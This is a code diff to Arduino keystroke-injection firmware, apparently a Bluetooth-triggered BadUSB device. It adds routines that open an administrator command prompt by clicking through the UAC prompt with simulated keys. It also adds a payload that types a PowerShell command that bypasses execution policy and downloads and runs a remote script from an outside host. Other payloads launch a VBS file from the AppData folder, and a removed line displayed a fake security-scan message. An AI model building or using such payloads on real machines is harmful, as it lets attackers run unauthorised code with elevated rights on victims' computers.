@@ -10,6 +10,30 @@ void runBox(){
   delay(100);
 }
 
+void openCmd(){
+  runBox();
+  Keyboard.print("cmd");
+  returnRelease();
+  delay(100);
+}
+void openCmdAsAdmin(){
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.releaseAll();
+  delay(200);
+  Keyboard.print("cmd");
+  delay(300);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(400);
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(200);
+}
+
 
 void payload() {
   runBox();
@@ -26,7 +50,7 @@ void payload2() {
   returnRelease();
   Keyboard.print("Set wshShell = CreateObject( \"WScript.Shell\" )");
   Keyboard.press(KEY_RETURN);
-  Keyboard.print("WScript.Echo wshShell.ExpandEnvironmentStrings( \"Hello \" + \"%USERNAME%\" + \". An urgent security scan is underway. Please do not click OK\")");
+  Keyboard.print("");
   returnRelease();
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('c');
@@ -40,6 +64,11 @@ void payload2() {
 void payload3(){
   runBox();
   Keyboard.print("wscript.exe %appdata%\\nokia.vbs");
+  returnRelease();
+}
+void payload4(){
+  openCmdAsAdmin();
+  Keyboard.print("@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('http://robertbarrett.com/files/helloworld.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"");
   returnRelease();
 }
 
@@ -64,5 +93,13 @@ void loop() {
        payload3();
        Serial3.print("\r\nPayload 3 sent\r\n");
     }
+    else if(btRead == '4'){
+       payload4();
+       Serial3.print("\r\nPayload 4 sent\r\n");
+    }
+    else if(btRead == '5'){
+    }
+
+    
   }
 }
